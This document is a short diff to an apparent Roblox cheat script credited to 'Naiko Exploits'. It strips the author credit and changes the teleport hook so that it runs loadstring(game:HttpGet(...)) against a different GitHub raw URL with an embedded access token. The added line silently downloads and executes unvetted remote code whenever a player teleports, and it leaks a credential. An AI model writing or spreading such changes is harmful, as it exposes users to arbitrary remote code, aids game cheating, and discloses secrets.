@@ -1,4 +1,4 @@
--- Kat Plus Made by Naiko Exploits --
+--Modified
 
 repeat task.wait() until game:IsLoaded() and task.wait(1.5)
 
@@ -544,7 +544,7 @@ end
         end
 			local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
 			if queue_on_teleport ~= nil then
-    		queue_on_teleport("loadstring(game:HttpGet(('https://raw.githubusercontent.com/NaikoScript/Kat-Plus/main/Script_linkhere')))()")
+    		queue_on_teleport("loadstring(game:HttpGet(('https://raw.githubusercontent.com/xoderin/testsci33345/refs/heads/main/mains/rq.lua?token=GHSAT0AAAAAAC6LIDT6OJJMIXXY2SSRPS5EZ5BR37Q')))()")
 			task.wait()
 		end
 		ChangeData("TargetServer.JobId",tostring(Server.id),true)
@@ -979,4 +979,4 @@ if ReturnData("TargetServer.JobId") == tostring(game.JobId) then
 		ChangeData("TargetServer.JobId","None")
 end
 
-ColoredPrint("Kat plus has loaded successfully",Color3.fromRGB(0,200,125),{"success",true})
+ColoredPrint("Loaded",Color3.fromRGB(0,200,125),{"success",true})
